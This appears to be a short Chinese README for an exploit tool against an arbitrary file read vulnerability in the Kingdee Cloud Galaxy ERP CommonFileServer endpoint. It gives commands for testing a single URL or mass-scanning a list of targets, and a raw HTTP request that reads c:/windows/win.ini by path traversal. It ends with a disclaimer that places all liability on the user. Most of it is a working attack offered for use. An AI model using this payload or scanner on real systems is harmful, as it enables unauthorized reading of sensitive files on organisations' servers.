# 金蝶云星空 CommonFileserver 任意文件读取

金蝶云星空 /CommonFileserver 存在任意文件读取漏洞。


## 工具利用

python3 Kingdee-erp_fileread.py -u http://127.0.0.1:1111 单个url测试

python3 Kingdee-erp_fileread.py -f url.txt 批量检测

![exp](./poc.jpg)

读取win.ini文件内容
```
GET /CommonFileServer/c:/windows/win.ini HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.676.91 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close

```

## 免责声明

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。
